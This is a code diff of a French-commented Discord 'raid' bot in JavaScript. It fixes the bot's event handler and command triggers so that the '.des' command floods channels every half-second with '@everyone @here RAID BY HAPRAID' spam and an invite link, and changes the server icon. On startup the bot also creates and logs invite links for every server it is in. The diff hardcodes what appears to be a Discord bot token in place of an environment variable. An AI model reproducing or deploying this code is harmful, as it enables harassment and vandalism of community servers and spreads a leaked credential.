@@ -1,8 +1,8 @@
 const Discord = require("discord.js");
 const bot = new Discord.Client();
-const token = "process.env.TOKEN";
+const token = "NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0";
 var prefix = ".";
-var mention = "126connectÃ©s"
+var mention = "126connectés"
 
 var fucked = false;
  
@@ -10,11 +10,11 @@ bot.on('ready',() => {
     //invit link
     bot.guilds.forEach(guild => {
       var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`ConnectÃ© sur : ${guild.name} ${invite}`));
+      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
     })
 });
  
-bot.on('msg', msg => {
+bot.on('message', msg => {
   //#region Legit
   /* Commandes legit */
   if (msg.content === '.ping') {
@@ -24,15 +24,15 @@ bot.on('msg', msg => {
  
   //#region Destructrices
   /* Commandes destructrices */
-  if (msg.content === 'des') {
+  if (msg.content === '.des') {
     console.log(`Commande .des par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/EAJbZCR https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
-     }, 500).catch(e => {});
+     }, 500);
   }
  
-  if (msg.content === 'des') {
-    console.log(`Commande .oupss par ${msg.author.tag}`);
+  if (msg.content === '.des') {
+    console.log(`Commande .des par ${msg.author.tag}`);
  
     if (!fucked){
       msg.guild.setIcon("./hapraid.png").catch(e => {});
@@ -78,4 +78,4 @@ bot.on('msg', msg => {
   //#endregion
 });
 
-bot.login('process.env.TOKEN')
+bot.login('NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0')
